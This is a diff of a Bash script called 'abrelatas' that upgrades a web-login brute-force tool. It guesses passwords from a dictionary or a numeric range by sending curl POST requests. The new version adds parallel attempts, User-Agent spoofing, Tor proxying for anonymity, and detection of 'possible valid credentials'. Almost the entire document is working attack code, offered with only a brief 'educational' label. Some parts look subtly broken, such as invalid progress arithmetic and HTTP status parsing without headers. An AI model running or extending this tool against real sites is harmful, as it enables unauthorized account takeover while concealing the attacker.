@@ -4,22 +4,37 @@
 # Creado por cbenitez10
 # Script creado con fines educativos
 # y laborales
+# Versión mejorada con sugerencias
 #####################################
 
-VERSION=0.0.1
+VERSION="0.1.0"
 
-#Colors
-greenColor="\033[0;32m\033[1m"
-redColor="\033[0;31m\033[1m"
-blueColor="\033[0;34m\033[1m"
-yellowColor="\033[0;33m\033[1m"
-purpleColor="\033[0;35m\033[1m"
-turquoiseColor="\033[0;36m\033[1m"
-grayColor="\033[0;37m\033[1m"
-endColor="\033[0m\033[0m"
+# Configuración de colores (usando array asociativo)
+declare -A colors=(
+    ["green"]="\033[0;32m\033[1m"
+    ["red"]="\033[0;31m\033[1m"
+    ["blue"]="\033[0;34m\033[1m"
+    ["yellow"]="\033[0;33m\033[1m"
+    ["purple"]="\033[0;35m\033[1m"
+    ["turquoise"]="\033[0;36m\033[1m"
+    ["gray"]="\033[0;37m\033[1m"
+    ["end"]="\033[0m\033[0m"
+)
 
-usage(){
-  echo -e "${redColor}\n"
+# Configuración inicial
+trap 'cleanup; exit' INT TERM EXIT
+tput civis
+
+# Variables globales
+cookie_jar=".abrelatas_cookies.txt"
+user_agents=(
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
+    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
+)
+
+usage() {
+  echo -e "${colors[red]}\n"
   echo -e "
   ▄▄▄       ▄▄▄▄    ██▀███  ▓█████  ██▓    ▄▄▄     ▄▄▄█████▓ ▄▄▄        ██████ 
 ▒████▄    ▓█████▄ ▓██ ▒ ██▒▓█   ▀ ▓██▒   ▒████▄   ▓  ██▒ ▓▒▒████▄    ▒██    ▒ 
@@ -32,251 +47,444 @@ usage(){
       ░  ░ ░         ░        ░  ░    ░  ░     ░  ░              ░  ░      ░  
                 ░                                                              \n"
 
-  echo -e "${greenColor}Script de Fuerza Bruta creado por cbenitez10";
-  echo -e "${yellowColor}";
-  echo -e "uso: abrelatas <opcion>"
-	echo
-	echo "Opciones disponibles:"
-	echo "   ayuda        -h     Ayuda sobre opciones y subcomandos."
+  echo -e "${colors[green]}Script de Fuerza Bruta mejorado${colors[end]}"
+  echo -e "${colors[yellow]}"
+  echo -e "Uso: abrelatas [opciones]"
   echo
-	echo "   Tipos de ataque:"
-	echo "     rango        -r     Rango de numeros consecutivos para usar como contrasena. Ejemplo: -r 100-200"
-	echo "     diccionario  -d     En lugar de usar el rango utiliza un diccionario de claves."
-	echo
-	echo "     Opciones de ataque:"
-  echo "       url          -u     URL de la victima."
-	echo "       delay        -s     El tiempo en segundos que va a tardar en ejecutar el siguiente ataque."
-	echo "       method       -m     Metodo a utilizar POST por defecto."
-	echo "       payload      -p     El payload que se va a enviar por el metodo seleccionado."
-	echo "                           Donde va el campo clave o password usar la palabra comodin ABRIR."
-	echo "                           Ejemplo: username=admin&password=ABRIR"
-	echo
-  echo "       archivo      -a     Archivo payload en lugar de usar -p."
-	echo "       version      -v     Muestra la version instalada."
-	echo
-	echo -e "${endColor}"
+  echo "Opciones principales:"
+  echo "  -h, --help               Mostrar esta ayuda"
+  echo "  -v, --version            Mostrar versión"
+  echo "  -V, --verbose            Modo verboso"
+  echo
+  echo "Opciones de ataque:"
+  echo "  -u, --url URL            URL objetivo (requerido)"
+  echo "  -m, --method METHOD      Método HTTP (default: POST)"
+  echo "  -s, --delay SECONDS      Delay entre intentos (default: 0)"
+  echo "  -P, --parallel NUM       Número de procesos paralelos"
+  echo
+  echo "Tipo de ataque (seleccionar uno):"
+  echo "  -r, --range FROM-TO      Rango numérico (ej. 1000-2000)"
+  echo "  -d, --dict FILE          Archivo diccionario"
+  echo
+  echo "Opciones de payload:"
+  echo "  -p, --payload DATA       Datos a enviar (usar ABRIR para clave)"
+  echo "  -a, --payload-file FILE  Archivo con datos payload"
+  echo "  -f, --format FORMAT      Formato (form/json, default: form)"
+  echo
+  echo "Opciones avanzadas:"
+  echo "  -H, --header HEADER      Header HTTP adicional (puede usarse múltiples veces)"
+  echo "  -c, --cookies FILE       Archivo de cookies a usar"
+  echo "  -o, --output FILE        Archivo de salida personalizado"
+  echo "  --random-agent           Usar User-Agent aleatorio"
+  echo "  --tor                    Usar proxy TOR (127.0.0.1:9050)"
+  echo
+  echo -e "Ejemplos:"
+  echo "  abrelatas -u https://example.com/login -d passwords.txt -p 'user=admin&pass=ABRIR'"
+  echo "  abrelatas -u https://api.example.com/auth -r 1000-9999 -a data.json --format json"
+  echo -e "${colors[end]}"
 }
 
-# Main function 
-main() {
-  method="POST"
-  payloadFile=0
-  
-  # Options
-  while getopts "a:d:f:hm:p:r:s:u:v" opt; do
-    case ${opt} in
-      a )
-        payloadFilePath=$OPTARG
-        payloadFile=1
-        ;;
-      d )
-        filePath=$OPTARG
-        typeAttack="dictionary"
-        ;;
-      h )
-        usage
-        exit 1
-        ;;
-      m )
-        if [ $OPTARG != "POST" ]; then
-          method=$OPTARG
+# Funciones de utilidad
+cleanup() {
+    [[ -f "$cookie_jar" ]] && rm -f "$cookie_jar"
+    tput cnorm
+}
+
+error_message() {
+    echo -e "\n${colors[red]}[!] $1 ${colors[end]}\n" >&2
+    exit 1
+}
+
+success_message() {
+    echo -e "\n${colors[green]}[+] $1 ${colors[end]}\n"
+}
+
+info_message() {
+    echo -e "${colors[blue]}[*] $1 ${colors[end]}"
+}
+
+validate_url() {
+    local url_regex='^(https?|ftp)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]$'
+    if [[ ! "$1" =~ $url_regex ]]; then
+        error_message "URL no válida: $1"
+    fi
+}
+
+validate_number() {
+    if ! [[ "$1" =~ ^[0-9]+$ ]]; then
+        error_message "$2 debe ser un número válido"
+    fi
+}
+
+validate_file() {
+    if [[ ! -f "$1" || ! -r "$1" ]]; then
+        error_message "Archivo $2 no accesible: $1"
+    fi
+}
+
+random_user_agent() {
+    echo "${user_agents[$RANDOM % ${#user_agents[@]}]}"
+}
+
+generate_filename() {
+    local url="$1"
+    local name=$(echo "$url" | awk -F'//' '{print $2}' | awk -F'/' '{print $1}' | sed 's/[^a-zA-Z0-9]/_/g')
+    echo "${name}-$(date +"%Y%m%d%H%M%S").log"
+}
+
+# Configuración de headers
+setup_headers() {
+    headers=()
+    
+    # Content-Type basado en formato
+    if [[ "$payload_format" == "json" ]]; then
+        headers+=("Content-Type: application/json")
+    else
+        headers+=("Content-Type: application/x-www-form-urlencoded")
+    fi
+    
+    # User-Agent
+    if [[ "$random_agent" -eq 1 ]]; then
+        headers+=("User-Agent: $(random_user_agent)")
+    else
+        headers+=("User-Agent: abrelatas/$VERSION")
+    fi
+    
+    # Headers adicionales
+    for header in "${extra_headers[@]}"; do
+        headers+=("$header")
+    done
+    
+    # Preparar argumentos para curl
+    header_args=()
+    for h in "${headers[@]}"; do
+        header_args+=("-H" "$h")
+    done
+}
+
+# Configuración de proxy
+setup_proxy() {
+    if [[ "$use_tor" -eq 1 ]]; then
+        proxy_args=("--socks5-hostname" "127.0.0.1:9050")
+    else
+        proxy_args=()
+    fi
+}
+
+# Configuración de cookies
+setup_cookies() {
+    if [[ -n "$cookies_file" ]]; then
+        cookie_args=("--cookie" "$cookies_file" "--cookie-jar" "$cookies_file")
+    else
+        cookie_args=("--cookie-jar" "$cookie_jar")
+        [[ -f "$cookie_jar" ]] && cookie_args+=("--cookie" "$cookie_jar")
+    fi
+}
+
+# Función para enviar petición
+send_request() {
+    local attempt="$1"
+    local data_payload="${payload_prefix}${attempt}${payload_suffix}"
+    
+    local curl_cmd=(
+        "curl" "-s" "-L" "-X" "$method"
+        "${header_args[@]}"
+        "${cookie_args[@]}"
+        "${proxy_args[@]}"
+        "--connect-timeout" "10"
+        "--max-time" "30"
+    )
+    
+    if [[ "$method" == "POST" ]]; then
+        if [[ "$payload_format" == "json" ]]; then
+            curl_cmd+=("--data-raw" "$data_payload")
+        else
+            # Convertir form-data a formato curl
+            IFS='&' read -ra items <<< "$data_payload"
+            for item in "${items[@]}"; do
+                curl_cmd+=("--data-urlencode" "$item")
+            done
         fi
-        ;;
-      p )
-        payload=$OPTARG
-        ;;
-      r )
-        typeAttack="range"
-        rangeFrom=$(echo $OPTARG | awk -F'-' '{print $1}')
-        rangeTo=$(echo $OPTARG | awk -F'-' '{print $2}')
-        ;;
-      s )
-        delay=$OPTARG
-        ;;
-      u )
-        targetUrl=$OPTARG
-        ;;
-      v )
-        echo "\n${blueColor}[*] Version: ${VERSION}${endColor}"
-        ;;
-      \? )
-        echo "Invalid Option: -$OPTARG" 1>&2
-        exit 1
-        ;;
-      * )
-        usage
-        exit 1
-        ;;
-    esac
-  done
-  shift $((OPTIND -1))
-  
-  sleep 0.5
-
-  startAttack 
-}
-
-# Range attack function
-dictionaryAttack(){
-  local attack=""
-  if [ "$payloadFile" -eq 1 ]; then
-    payload=$(cat $payloadFilePath)
-  fi
-  
-  if [ "$targetUrl" = '' ]; then
-    errorMessage "Se necesita ingresar la url victima"
-  fi
-  
-  if [ "$payload" = '' ]; then
-    errorMessage "El payload es requerido, ejemplo: username=admin&password=ABRIR&token=63asdfuh2uo4h23ny8asdf8"
-  fi
-  
-  if [ ! -f "$filePath" ]; then
-    errorMessage "Debe poner la ruta del archivo"
-  fi
-  
-  echo -e "${greenColor}[*] Iniciando ataque ${endColor}\n"
-
-  configHeader
-  payload1=$(echo $payload | awk -F'ABRIR' '{print $1}')
-  payload2=$(echo $payload | awk -F'ABRIR' '{print $2}')
-  fileName=$(setFileName $targetUrl)
-  
-  fmt="%-25s | %-25s | %-15s | %-12s\n"
-  echo -e "Target: ${greenColor}${targetUrl}${endColor}"
-  echo -e "Payload: ${greenColor}${payload}${endColor}\n"
-  printf "$fmt" "PASSWORD" "TOTAL_CARACTERES" "HTTP_CODE" "RESPONSE_TIME"
-  echo "-------------------------------------------------------------------------------------------"
-  while read  -r  line; do
-    dataPayload="${payload1}${line}${payload2}"
-    if [ "$dataType" = "json" ]; then
-      dataRaw="--data-raw ${dataPayload}"
-    else 
-      dataRaw=$(echo "&${dataPayload}" | sed 's/&/ --data-urlencode /g')
     fi
-
-    result=$(curl -s -L -X ${method} ${targetUrl} --header ${header} ${dataRaw})
-    totalCharacters=$(echo -n $result | wc -c) 
-
-    printf "$fmt" "$line" "$totalCharacters" "$code" "$time"
-    toSave="Password: $line | Total caracteres: $totalCharacters"
-    echo $toSave >> $fileName
-    setSleep
-  done < $filePath
-  echo -e "${greenColor}[*] Ataque culminado ${endColor}"
-  echo -e "${yellowColor}[*] Datos guardados en el archivo: ${greenColor}$fileName ${endColor}"
-}
-# end Range
-
-# Range attack function
-rangeAttack(){
-  local attack=""
-  if [ "$payloadFile" -eq 1 ]; then
-    payload=$(cat $payloadFilePath)
-  fi
-  
-  if [ "$targetUrl" = '' ]; then
-    errorMessage "Se necesita ingresar la url victima"
-  fi
-  
-  if [ "$payload" = '' ]; then
-    errorMessage "El payload es requerido, ejemplo: username=admin&password=ABRIR&token=63asdfuh2uo4h23ny8asdf8"
-  fi
-  
-  if [ "$rangeFrom" = '' ] || [ "$rangeTo" = '' ]; then
-    errorMessage "Debe ingresar un rango separado por un (-), ejemplo: 100-200"
-  fi
-  
-  echo -e "${greenColor}[*] Iniciando ataque ${endColor}"
-  
-  configHeader 
-  payload1=$(echo $payload | awk -F'ABRIR' '{print $1}')
-  payload2=$(echo $payload | awk -F'ABRIR' '{print $2}')
-  fileName=$(setFileName $targetUrl)
-  
-  fmt="%-25s | %-25s | %-15s | %-12s\n"
-  echo -e "Target: ${greenColor}${targetUrl}${endColor}"
-  echo -e "Payload: ${greenColor}${payload}${endColor}\n"
-  printf "$fmt" "PASSWORD" "TOTAL_CARACTERES" "HTTP_CODE" "RESPONSE_TIME"
-  echo "-------------------------------------------------------------------------------------------"
-  for (( c=$rangeFrom; c<=$rangeTo; c++ )); do
-    dataPayload="${payload1}${c}${payload2}"
-    if [ "$dataType" = "json" ]; then
-      dataRaw="--data-raw ${dataPayload}"
-    else 
-      dataRaw=$(echo "&${dataPayload}" | sed 's/&/ --data-urlencode /g')
+    
+    curl_cmd+=("$target_url")
+    
+    if [[ "$verbose" -eq 1 ]]; then
+        echo -e "${colors[gray]}Ejecutando: ${curl_cmd[@]}${colors[end]}" >&2
     fi
-
-    result=$(curl -s -L -X ${method} ${targetUrl} --header ${header} ${dataRaw})
-    totalCharacters=$(echo -n $result | wc -c) 
-
-    printf "$fmt" "$line" "$totalCharacters" "$code" "$time"
-    toSave="Password: $line | Total caracteres: $totalCharacters"
-    echo $toSave >> $fileName
-    setSleep  
-  done
-  echo -e "${greenColor}[*] Ataque culminado ${endColor}"
-  echo -e "${yellowColor}[*] Datos guardados en el archivo: ${greenColor}$fileName ${endColor}"
-}
-# end Range
-
-####################
-# Controlar la salida
-trap ctrl_c INT
-ctrl_c(){
-	echo -e "\n${redColor}[*] Saliendo...${endColor}"
-	exit 1
+    
+    # Ejecutar y capturar salida, código HTTP y tiempo
+    exec 3>&1
+    local response=$( { time -p "${curl_cmd[@]}" 1>&3; } 2>&1 )
+    exec 3>&-
+    
+    # Extraer métricas
+    local http_code=$(echo "$response" | grep -o 'HTTP/[0-9.]* [0-9]*' | tail -1 | awk '{print $2}')
+    local time_total=$(echo "$response" | grep -o '^real.*' | awk '{print $2}')
+    
+    echo "$response" | head -n -3
+    echo "HTTP_CODE:$http_code"
+    echo "TIME_TOTAL:$time_total"
 }
 
-# getName
-setFileName(){
-  local URL=$1
-  local setName=$(echo $URL | awk -F'//' '{print $2}' | awk -F'/' '{print $1}')
-  local _DATE=$(date +"%Y%m%d")
-  setName="${setName}-${_DATE}.log"
-  echo $setName 
+# Función para procesar resultados
+process_results() {
+    local attempt="$1"
+    local response="$2"
+    
+    local content=$(echo "$response" | sed '/HTTP_CODE:/,$d')
+    local http_code=$(echo "$response" | grep 'HTTP_CODE:' | cut -d: -f2)
+    local time_total=$(echo "$response" | grep 'TIME_TOTAL:' | cut -d: -f2)
+    
+    local content_length=$(echo -n "$content" | wc -c)
+    
+    # Mostrar resultados
+    if [[ "$verbose" -eq 1 ]]; then
+        echo -e "\n${colors[purple]}=== Intento: $attempt ===${colors[end]}"
+        echo "$content"
+        echo -e "${colors[yellow]}Código HTTP: $http_code | Tiempo: ${time_total}s | Longitud: $content_length${colors[end]}"
+    else
+        printf "%-20s | %-6s | %-8s | %-10s\n" "$attempt" "$http_code" "${time_total}s" "$content_length"
+    fi
+    
+    # Guardar en archivo
+    echo "$(date +"%Y-%m-%d %H:%M:%S") | $attempt | $http_code | $time_total | $content_length | $content" >> "$output_file"
+    
+    # Verificar si fue exitoso (puedes personalizar esta lógica)
+    if [[ "$http_code" -eq 200 ]] && [[ "$content_length" -lt 1000 ]]; then
+        echo -e "${colors[green]}¡Posible éxito! Intento: $attempt${colors[end]}"
+        echo "¡Posible éxito! Intento: $attempt | Código: $http_code | Longitud: $content_length" >> "${output_file}.success"
+    fi
 }
 
-# error Message
-errorMessage(){
-  echo -e "\n${redColor}[!] $1 ${endColor}\n"
-  exit 1
+# Ataque por diccionario
+dictionary_attack() {
+    info_message "Iniciando ataque por diccionario contra: $target_url"
+    info_message "Usando diccionario: $dictionary_file"
+    info_message "Archivo de salida: $output_file"
+    
+    local total_lines=$(wc -l < "$dictionary_file")
+    local current_line=0
+    
+    while read -r line; do
+        ((current_line++))
+        echo -ne "${colors[gray]}Progreso: $current_line/$total_lines (${((current_line*100/total_lines))}%)${colors[end]}\r"
+        
+        local response=$(send_request "$line")
+        process_results "$line" "$response"
+        
+        [[ "$delay" -gt 0 ]] && sleep "$delay"
+    done < "$dictionary_file"
+    
+    success_message "Ataque por diccionario completado"
 }
 
-# config Header
-configHeader(){
-  dataType="x-form"
-  header="'Content-Type: application/x-www-form-urlencoded;charset=UTF-8'"
-  verifyPayload=$(echo $payload | python -c "import sys,json;json.loads(sys.stdin.read());print('OK')" 2>/dev/null)
-  if [ "$verifyPayload" = "OK" ]; then
-    header="'Content-Type: application/json;charset=UTF-8'" 
-    dataType="json"
-  fi
+# Ataque por rango numérico
+range_attack() {
+    info_message "Iniciando ataque por rango numérico contra: $target_url"
+    info_message "Rango: $range_start-$range_end"
+    info_message "Archivo de salida: $output_file"
+    
+    local total=$((range_end - range_start + 1))
+    local current=0
+    
+    for ((i=range_start; i<=range_end; i++)); do
+        ((current++))
+        echo -ne "${colors[gray]}Progreso: $current/$total (${((current*100/total))}%)${colors[end]}\r"
+        
+        local response=$(send_request "$i")
+        process_results "$i" "$response"
+        
+        [[ "$delay" -gt 0 ]] && sleep "$delay"
+    done
+    
+    success_message "Ataque por rango completado"
 }
 
-# set Sleep 
-setSleep(){
-  if [ "$delay" = "" ]; then
+# Procesamiento en paralelo
+parallel_attack() {
+    info_message "Iniciando ataque paralelo ($parallel_processes procesos) contra: $target_url"
+    
+    # Exportar variables y funciones necesarias
+    export -f send_request process_results random_user_agent
+    export target_url method payload_prefix payload_suffix payload_format
+    export verbose colors header_args cookie_args proxy_args
+    
+    local xargs_args=(
+        "-P" "$parallel_processes"
+        "-I" "{}"
+        "bash" "-c" "send_request \"{}\""
+    )
+    
+    if [[ "$attack_type" == "dictionary" ]]; then
+        info_message "Usando diccionario: $dictionary_file"
+        cat "$dictionary_file" | xargs "${xargs_args[@]}"
+    else
+        info_message "Rango: $range_start-$range_end"
+        seq "$range_start" "$range_end" | xargs "${xargs_args[@]}"
+    fi
+    
+    success_message "Ataque paralelo completado"
+}
+
+# Función principal
+main() {
+    # Valores por defecto
+    method="POST"
     delay=0
-  fi
-  sleep $delay
+    verbose=0
+    random_agent=0
+    use_tor=0
+    parallel_processes=1
+    payload_format="form"
+    output_file=""
+    
+    # Parsear argumentos
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            -h|--help)
+                usage
+                exit 0
+                ;;
+            -v|--version)
+                echo "abrelatas versión $VERSION"
+                exit 0
+                ;;
+            -V|--verbose)
+                verbose=1
+                shift
+                ;;
+            -u|--url)
+                target_url="$2"
+                validate_url "$target_url"
+                shift 2
+                ;;
+            -m|--method)
+                method="$2"
+                shift 2
+                ;;
+            -s|--delay)
+                delay="$2"
+                validate_number "$delay" "Delay"
+                shift 2
+                ;;
+            -P|--parallel)
+                parallel_processes="$2"
+                validate_number "$parallel_processes" "Procesos paralelos"
+                shift 2
+                ;;
+            -r|--range)
+                attack_type="range"
+                range_start=$(echo "$2" | cut -d'-' -f1)
+                range_end=$(echo "$2" | cut -d'-' -f2)
+                validate_number "$range_start" "Inicio de rango"
+                validate_number "$range_end" "Fin de rango"
+                shift 2
+                ;;
+            -d|--dict)
+                attack_type="dictionary"
+                dictionary_file="$2"
+                validate_file "$dictionary_file" "diccionario"
+                shift 2
+                ;;
+            -p|--payload)
+                payload="$2"
+                if [[ "$payload" != *"ABRIR"* ]]; then
+                    error_message "El payload debe contener el marcador ABRIR"
+                fi
+                payload_prefix="${payload%%ABRIR*}"
+                payload_suffix="${payload#*ABRIR}"
+                shift 2
+                ;;
+            -a|--payload-file)
+                payload_file="$2"
+                validate_file "$payload_file" "payload"
+                payload=$(cat "$payload_file")
+                if [[ "$payload" != *"ABRIR"* ]]; then
+                    error_message "El payload debe contener el marcador ABRIR"
+                fi
+                payload_prefix="${payload%%ABRIR*}"
+                payload_suffix="${payload#*ABRIR}"
+                shift 2
+                ;;
+            -f|--format)
+                payload_format="$2"
+                [[ "$payload_format" != "form" && "$payload_format" != "json" ]] && 
+                    error_message "Formato debe ser 'form' o 'json'"
+                shift 2
+                ;;
+            -H|--header)
+                extra_headers+=("$2")
+                shift 2
+                ;;
+            -c|--cookies)
+                cookies_file="$2"
+                validate_file "$cookies_file" "cookies"
+                shift 2
+                ;;
+            -o|--output)
+                output_file="$2"
+                shift 2
+                ;;
+            --random-agent)
+                random_agent=1
+                shift
+                ;;
+            --tor)
+                use_tor=1
+                shift
+                ;;
+            *)
+                error_message "Opción desconocida: $1"
+                ;;
+        esac
+    done
+    
+    # Validaciones requeridas
+    [[ -z "$target_url" ]] && error_message "URL objetivo es requerida (-u)"
+    [[ -z "$attack_type" ]] && error_message "Debe especificar tipo de ataque (-r o -d)"
+    [[ -z "$payload_prefix" ]] && error_message "Payload es requerido (-p o -a)"
+    
+    # Configurar archivo de salida
+    [[ -z "$output_file" ]] && output_file=$(generate_filename "$target_url")
+    
+    # Configurar componentes
+    setup_headers
+    setup_proxy
+    setup_cookies
+    
+    # Mostrar resumen
+    echo -e "\n${colors[yellow]}=== RESUMEN DE CONFIGURACIÓN ==="
+    echo "URL objetivo: $target_url"
+    echo "Método HTTP: $method"
+    echo "Tipo de ataque: $attack_type"
+    if [[ "$attack_type" == "dictionary" ]]; then
+        echo "Diccionario: $dictionary_file"
+    else
+        echo "Rango: $range_start-$range_end"
+    fi
+    echo "Delay entre intentos: ${delay}s"
+    echo "Archivo de salida: $output_file"
+    echo -e "==============================${colors[end]}\n"
+    
+    # Iniciar ataque
+    if [[ "$parallel_processes" -gt 1 ]]; then
+        parallel_attack
+    else
+        case "$attack_type" in
+            "dictionary") dictionary_attack ;;
+            "range") range_attack ;;
+        esac
+    fi
+    
+    # Mostrar resultados finales
+    if [[ -f "${output_file}.success" ]]; then
+        success_message "Se encontraron posibles credenciales válidas:"
+        cat "${output_file}.success"
+    else
+        info_message "No se encontraron credenciales válidas"
+    fi
 }
-#######################
 
-# Start Attack 
-startAttack(){
-  clear;
-
-  case ${typeAttack} in
-    range )
-      rangeAttack
-      ;;
-    dictionary )
-      dictionaryAttack
-      ;;
-  esac
-
-}
-
-# Executor
+# Ejecutar script principal
 main "$@"
